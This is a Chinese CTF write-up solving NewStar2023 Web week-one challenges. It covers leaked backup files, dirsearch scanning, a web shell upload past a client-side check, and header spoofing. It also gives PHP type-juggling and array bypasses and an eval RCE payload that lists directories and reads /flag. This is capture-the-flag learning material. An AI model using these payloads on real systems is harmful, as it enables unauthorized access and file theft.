### NewStar2023 Web Week1

```
粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息!
```

考点：敏感信息的泄露

常见的三种：

```
robots.txt
www.zip
index.php,swp
```

或者dirsearch扫描得到www.zip

获取到flag{r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous}

![image-20231013230844146](C:\Users\gyz1\AppData\Roaming\Typora\typora-user-images\image-20231013230844146.png)

```python
dirsearch简单用法

python3 dirsearch.py -u https://target
 
python3 dirsearch.py -e php,html,js -u https://target
 
python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist
# -e 指定文件类型 -u 指定字典目录
```

![image-20231014115731015](C:\Users\gyz1\AppData\Roaming\Typora\typora-user-images\image-20231014115731015.png)



#### Begin of Upload

关闭前端javascript上传shell.php即可



#### Begin of HTTP

进入题目首先要求以GET方式传参：

接着要求以POST方式传递secret参数，并且secret参数的值是固定的：

右键查看页面源代码可以看到base64编码后的secret值：

base64解码得到

n3wst4rCTF2023g00000d

![图片](E:\edge_download\图片.png)

使用HackBar发送secret：

接着题目要求power为ctfer，使用Burp Suite抓包修改Cookie值：

接着修改U-A头为NewStarCTF2023：

修改Referer头为newstarctf.com：

添加X-Real-IP头，值为127.0.0.1，获得Flag



#### flaskError

![image-20231014170624767](C:\Users\gyz1\AppData\Roaming\Typora\typora-user-images\image-20231014170624767.png)

http头拼接传入数组：

?number1=k&number2=8 即可得到flag

![image-20231014171255553](C:\Users\gyz1\AppData\Roaming\Typora\typora-user-images\image-20231014171255553.png)



#### Begin of PHP

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

if(isset($_GET['key1']) && isset($_GET['key2'])){
    echo "=Level 1=<br>";
    if($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){
        $flag1 = True;
    }else{
        die("nope,this is level 1");
    }
}

if($flag1){
    echo "=Level 2=<br>";
    if(isset($_POST['key3'])){
        if(md5($_POST['key3']) === sha1($_POST['key3'])){
            $flag2 = True;
        }
    }else{
        die("nope,this is level 2");
    }
}

if($flag2){
    echo "=Level 3=<br>";
    if(isset($_GET['key4'])){
        if(strcmp($_GET['key4'],file_get_contents("/flag")) == 0){
            $flag3 = True;
        }else{
            die("nope,this is level 3");
        }
    }
}

if($flag3){
    echo "=Level 4=<br>";
    if(isset($_GET['key5'])){
        if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){
            $flag4 = True;
        }else{
            die("nope,this is level 4");
        }
    }
}

if($flag4){
    echo "=Level 5=<br>";
    extract($_POST);
    foreach($_POST as $var){
        if(preg_match("/[a-zA-Z0-9]/",$var)){
            die("nope,this is level 5");
        }
    }
    if($flag5){
        echo file_get_contents("/flag");
    }else{
        die("nope,this is level 5");
    }
}
```

**Level 1**：要求用户提供两个参数 key1 和 key2，并检查它们是否不同 且它们的MD5哈希值相等。

如果两个字符经MD5加密后为 0exxxxx的形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，结果都是零，所以是相等的。

这里提供几个MD5后为0e的值

> QNKCDZO
>
> 240610708
>
> s878926199a
>
> s155964671a
>
> s214587387a
>
> s214587387a



**Level 2**：用户需要通过POST请求提供 key3，并检查它的MD5哈希值是否与SHA-1哈希值相等。

Md5和sha1对一个数组进行加密将返回NULL；而NULL===NULL返回true，所以可绕过判断。



**Level 3**：用户需要提供 key4 参数，然后检查它是否与文件 "/flag" 中的内容相等。

strcmp是比较两个字符串，如果str1<str2 则返回<0 ，如果str1大于str2则返回>0 ，如果两者相等则返回0。

strcmp会判断字符串类型，如果强行传入其他类型参数，会出错，出错后返回值0，正是利用这点进行绕过。

同样传入数组进行绕过



**Level 4**：用户需要提供 key5 参数，然后检查它是否不是数字且大于 2023。

PHP的对字符串的转换规则是：若字符串以数字开头，则最终的转化结果为开头的数字，否则为0

所以这里我们传入2024a即可



**Level 5**：在这一级别，用户需要提供一些POST参数，并检查这些参数是否都不包含字母和数字。如果通过此检查，用户将能够查看 "/flag" 文件的内容。

同样数组绕过



/?key1=QNKCDZO&key2=240610708&key5=2029q&key4[]=1

POST：key3[]=1&flag5=?

flag{3793e633-1582-4d65-8311-b4f2f369d60d}



#### R!C!E!

```php
<?php
highlight_file(__FILE__);
if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){
    $password=md5($_POST['password']);
    $code=$_POST['e_v.a.l'];
    if(substr($password,0,6)==="c4d038"){
        if(!preg_match("/flag|system|pass|cat|ls/i",$code)){
            eval($code);
        }
    }
}
```

哈希碰撞解password

```python
import hashlib
def crack(pre):
    for i in range(0, 999999):
        if (hashlib.md5(str(i).encode("UTF-8")).hexdigest())[0:6] == str(pre):
              print(i)          
              break
crack("c4d038")
```

password=114514

php自动把名称中第一个不合法字符转化为下划线

使用正则表达式来检查变量 `$code` 中是否包含某些关键字，如 "flag"、"system"、"pass"、"cat" 和 "ls"。

先用scandir查看目录

```
POST：password=114514&e[v.a.l=var_dump(scandir('/'));
```

回显：

```
array(24) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(4) "flag" [8]=> string(4) "home" [9]=> string(3) "lib" [10]=> string(5) "lib64" [11]=> string(5) "media" [12]=> string(3) "mnt" [13]=> string(3) "opt" [14]=> string(4) "proc" [15]=> string(4) "root" [16]=> string(3) "run" [17]=> string(4) "sbin" [18]=> string(3) "srv" [19]=> string(8) "start.sh" [20]=> string(3) "sys" [21]=> string(3) "tmp" [22]=> string(3) "usr" [23]=> string(3) "var" } 
```

其中有flag，构造post传参：

password=114514&e[v.a.l=var_dump(file_get_contents($_POST['a']));&a=/flag

flag{b78387af-c47c-419d-b8c8-300d9dbdb64d}



#### EasyLogin

做不出来但是这个博主写的挺好的

[BUUCTF NewStarCTF 2023 WEB题WP_Dream ZHO的博客-CSDN博客](https://blog.csdn.net/qq_65165505/article/details/133357004?ops_request_misc=%7B%22request%5Fid%22%3A%22169727404716800222853609%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&request_id=169727404716800222853609&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-8-133357004-null-null.142^v96^pc_search_result_base8&utm_term=newstarctf web&spm=1018.2226.3001.4187)
